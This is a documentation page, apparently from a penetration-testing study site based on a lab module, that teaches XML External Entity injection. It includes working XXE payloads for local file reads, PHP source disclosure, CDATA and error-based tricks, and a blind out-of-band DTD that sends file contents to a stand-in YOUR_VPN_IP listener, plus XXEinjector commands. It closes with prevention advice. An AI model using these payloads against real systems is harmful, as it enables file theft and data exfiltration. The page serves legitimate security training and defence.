@@ -1,0 +1,240 @@
+---
+title: "XXE: XML External Entity Injection"
+sidebarTitle: "XXE"
+description: "Work through direct file reads, PHP filters, CDATA, error-based and blind XXE with explicit prerequisites."
+keywords: ["XXE", "XML external entity", "CDATA", "error based XXE", "blind XXE", "XXEinjector", "OOB"]
+boost: 2
+---
+
+{/* Generated from Web/XXE.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+Start here when an observed request contains XML or a feature processes an XML-based file. The parser and its configuration decide whether entities are resolved; the Content-Type label and server banner alone do not.
+
+## Read the XML before choosing a payload
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY marker "XXE-PROBE-742">
+]>
+<root>
+  <name>&marker;</name>
+  <details>Ordinary lab event</details>
+  <date>2026-11-09</date>
+</root>
+```
+
+`root` is the document element. The DOCTYPE introduces a DTD; the internal subset is inside square brackets. `<!ENTITY marker ...>` declares a general entity, and `&marker;` references it in the document. A parameter entity uses `%name;` inside a DTD. Declaring an entity is not the same as referencing it.
+
+First send the application's normal XML, identify a field reflected in the response, then put the harmless internal marker in that field. Keep required fields and the original transport format. An expanded marker establishes entity substitution, not external-file access. Literal `&marker;`, a generic success message or an error each requires a different next step.
+
+## Send a saved XML body without shell damage
+
+Run from Kali. Replace the endpoint and session with the current lab request. A quoted heredoc preserves XML punctuation; `--data-binary` sends the saved file without turning it into form fields.
+
+```bash
+BASE='http://TARGET:PORT'
+SESSION='REPLACE_WITH_CURRENT_SESSION'
+mkdir -p evidence/xxe
+cat > evidence/xxe/probe.xml <<'XML'
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY marker "XXE-PROBE-742">]>
+<root><name>&marker;</name><details>Test</details><date>2026-11-09</date></root>
+XML
+curl -sS --compressed -b "PHPSESSID=$SESSION" \
+  -H 'Content-Type: text/plain;charset=UTF-8' \
+  --data-binary @evidence/xxe/probe.xml \
+  -D evidence/xxe/response.headers -o evidence/xxe/response.body "$BASE/addEvent.php"
+rg -n 'XXE-PROBE|entity|DOCTYPE|error' evidence/xxe/response.body
+```
+
+The assessment used `text/plain;charset=UTF-8` while parsing an XML body. Other endpoints may require `application/xml`; preserve the working request first. A 200 response that says an event was created is not enough unless the selected marker is visible.
+
+## Direct local-file disclosure
+
+Replace the internal marker declaration with an external general entity. Use a small known lab file first and retain a field that the application reflects.
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY probe SYSTEM "file:///etc/hostname">
+]>
+<root><name>&probe;</name><details>Test</details><date>2026-11-09</date></root>
+```
+
+If the hostname is returned, the evidence supports reading that file through the parser with the application's permissions. It does not establish arbitrary code execution. A missing file, permission denial, disabled entity loading and a non-reflected field can all produce an empty result; compare a known readable file before changing techniques.
+
+## PHP source and base64 filters
+
+PHP source often contains characters that cannot be embedded directly into the XML output. On a PHP parser with the relevant wrapper available, encode the file before inserting it into a reflected field:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY source SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
+]>
+<root><name>&source;</name><details>Test</details><date>2026-11-09</date></root>
+```
+
+```bash
+# Save only the returned base64 value, without the surrounding HTML/message.
+printf %s 'PASTE_BASE64_VALUE' | base64 --decode > evidence/xxe/source.php
+sed -n '1,100p' evidence/xxe/source.php
+```
+
+Decoding writes a local evidence file; do not execute downloaded source. Use observed paths from errors, configuration or the lab objective rather than assuming a web URL maps to the same filesystem path. The `php://` wrapper is PHP-specific, not a universal XXE feature.
+
+## Choose the output channel
+
+| What you can observe | Next technique | What success establishes |
+| --- | --- | --- |
+| Controlled field reflected | Direct entity; PHP filter if appropriate | File bytes returned in the response |
+| Reflection exists but raw markup breaks parsing | External DTD plus CDATA | Compatible text placed in a reflected CDATA section |
+| Parser errors appear but fields are not reflected | Error-based disclosure | File content appears in a generated error |
+| Neither output nor useful errors | External DTD fetch, then blind OOB | Separate evidence for fetching the DTD and returning file content |
+| Only a generic 200 or timeout | Recheck baseline and prerequisites | No file disclosure established yet |
+
+## CDATA: separate the two files
+
+CDATA marks text as character data instead of XML markup. The module composes the CDATA wrapper through an external DTD because parameter-entity expansion has different restrictions in an internal DTD subset.
+
+On your Kali host, create `dtd/cdata.dtd` containing:
+
+```xml
+<!ENTITY joined "%begin;%file;%end;">
+```
+
+Serve only that directory, using your lab VPN address in the target's reference:
+
+```bash
+mkdir -p dtd
+printf '%s\n' '<!ENTITY joined "%begin;%file;%end;">' > dtd/cdata.dtd
+python3 -m http.server 8000 --bind 0.0.0.0 --directory dtd
+```
+
+Send this as the XML request, keeping the application's real fields:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY % begin "<![CDATA[">
+  <!ENTITY % file SYSTEM "file:///var/www/html/index.php">
+  <!ENTITY % end "]]>">
+  <!ENTITY % remote SYSTEM "http://YOUR_VPN_IP:8000/cdata.dtd">
+  %remote;
+]>
+<root><name>&joined;</name><details>Test</details><date>2026-11-09</date></root>
+```
+
+Expansion order: `%remote;` loads the DTD; its declaration builds `joined` from the wrapper and file; `&joined;` puts the result in the reflected field. A request for `cdata.dtd` only proves external retrieval. No reflection means this method has nowhere to display the result. CDATA is not arbitrary binary encoding: XML-invalid characters or `]]>` in the file can still break it, and parser behavior varies.
+
+## Error-based XXE explained step by step
+
+This was an unresolved learning point in the chat. Think of the error message as a different output location. You need a parser that expands the entities and exposes the resulting resource-resolution error to the client.
+
+First send a slightly malformed copy of the normal XML, such as one mismatched closing tag, to establish whether useful errors are exposed. Restore well-formed XML before trying the external DTD. A parse error by itself is not XXE.
+
+Host `error.dtd` with this parser-dependent lab pattern:
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % makeError "<!ENTITY &#x25; fail SYSTEM 'file:///nonexistent-lab-path/%file;'>">
+%makeError;
+%fail;
+```
+
+Reference it from the request:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY % remote SYSTEM "http://YOUR_VPN_IP:8000/error.dtd">
+  %remote;
+]>
+<root><name>Test</name><details>Test</details><date>2026-11-09</date></root>
+```
+
+1. `%remote;` fetches and parses the external DTD.
+2. `%file;` supplies the small file's text during expansion.
+3. `%makeError;` creates the `fail` parameter entity; `&#x25;` supplies the percent sign in that nested declaration.
+4. `%fail;` attempts to load a deliberately nonexistent path containing the text.
+5. If the parser includes that path in a visible error, the text is disclosed through the error rather than an application field.
+
+If only the DTD URL or an entity name appears, the file has not been recovered. Newlines, URI-invalid characters, suppressed errors, expansion restrictions and message truncation can defeat this pattern. The module's undefined-entity variant has the same limitation: it depends on the specific parser's diagnostic behavior. Neither variant is a guaranteed way to print every file. CDATA does not solve a lack of reflection.
+
+## Blind XXE and out-of-band callbacks
+
+Use a lab-controlled listener reachable from the target. `127.0.0.1` in the payload refers to the target itself. Check VPN routing, listener port, firewall and outbound access; a working listener in your browser does not prove the target can reach it.
+
+Start with a DTD that has no file-reading step and check for the target's request. Then introduce a small readable file. On the PHP lab, the external `oob.dtd` can contain:
+
+```xml
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
+<!ENTITY % makeCallback "<!ENTITY send SYSTEM 'http://YOUR_VPN_IP:8000/collect?content=%file;'>">
+```
+
+The request loads the declaration and explicitly references the generated entity:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY % remote SYSTEM "http://YOUR_VPN_IP:8000/oob.dtd">
+  %remote;
+  %makeCallback;
+]>
+<root><name>&send;</name><details>Test</details><date>2026-11-09</date></root>
+```
+
+Keep the HTTP server log. `GET /oob.dtd` means the DTD was retrieved. `GET /collect?content=...` is the separate content callback. Decode its value and compare it with the intended file; an empty callback still does not prove disclosure. A 404 for `/collect` can be fine if the request and its query were logged.
+
+```bash
+# Paste the exact content= value from the request target, excluding other parameters.
+# unquote preserves literal '+', unlike form-style unquote_plus.
+python3 - <<'PY'
+import base64
+from urllib.parse import unquote
+value = 'PASTE_ENCODED_QUERY_VALUE'
+print(base64.b64decode(unquote(value), validate=True).decode('utf-8', errors='replace'))
+PY
+```
+
+Base64 is not inherently URL-safe: `+`, `/`, `=` and URL/log length limits can cause failures. Use a small file first and preserve the raw request target. Raw base64 is also unsuitable for DNS labels without a DNS-safe encoding and chunking; DNS is not an automatic drop-in replacement.
+
+## XXEinjector after understanding the manual flow
+
+In the shared exercise the user recovered the blind-lab result using XXEinjector. Save a current working raw HTTP request, including Host with its actual port, session and the original content type. Place `XXEINJECT` after the XML declaration at the intended insertion point. Run from an existing reviewed installation:
+
+```bash
+# Inspect the generated request first; this is the tool's test mode.
+ruby XXEinjector.rb --host=YOUR_VPN_IP --httpport=8000 \
+  --file=xxe.req --path=/etc/hostname --oob=http --phpfilter --test
+
+# Then reproduce the module's lab recipe.
+ruby XXEinjector.rb --host=YOUR_VPN_IP --httpport=8000 \
+  --file=xxe.req --path=/etc/hostname --oob=http --phpfilter
+rg --files Logs
+```
+
+Do not leave the separate Python server occupying the tool's listener port. Inspect the files under `Logs` rather than assuming quiet terminal output means failure. These options follow the [XXEinjector documentation](https://github.com/enjoiz/XXEinjector); match the installed version and inspect its generated request. This notebook update did not execute the tool or its payloads.
+
+## What XXE does not automatically give you
+
+External retrieval can create an SSRF primitive, but supported schemes, egress and response handling constrain it. File reading follows the application account's permissions. The module's `expect://` execution requires an installed and enabled PHP extension; XXE alone does not imply a shell. Entity-expansion denial of service is a separate parser-resource issue and is unnecessary to establish the file-disclosure finding.
+
+## Prevention and retesting
+
+Disable unnecessary DTDs, external general/parameter entities and external resource resolution in the actual parser API. Review XInclude and downstream document processors separately. Keep parser libraries updated, bound input/resource consumption and avoid exposing detailed parser errors. Updating a library without checking options is insufficient: unsafe options can re-enable external loading. PHP's `LIBXML_NOENT` name is particularly misleading because it enables entity substitution. Follow the runtime-specific [OWASP XXE prevention guidance](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html), then retest normal XML and the minimal entity probe.
+
+Return to [Web Attacks](/web/web-attacks), [the assessment chain](/web/web-attacks-assessment), or the [complete source reference](/web/htb/web-attacks).
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Web Attacks: Enumeration and Attack Chains](/web/web-attacks) — Choose the next test from application behavior, identity, object references and request formats.
+- [HTTP Verb Tampering](/web/verb-tampering) — Compare method authorization and parameter placement; verify real effects and troubleshoot OPTIONS responses.
+- [IDOR and API Authorization](/web/idor) — Test object access, encoded references and token ownership; interpret API errors and compressed ffuf output.
+- [Web Attacks: Assessment Learning Notes](/web/web-attacks-assessment) — Follow the observed IDOR, reset-method and reflected-XML chain, with the troubleshooting lessons from the shared chat.
+- [Web Attacks — HTB Module](/web/htb/web-attacks) — Complete supplied Web Attacks capture, preserved separately from practical guides and corrections.
+
+{/* VAULT_RELATED_END */}
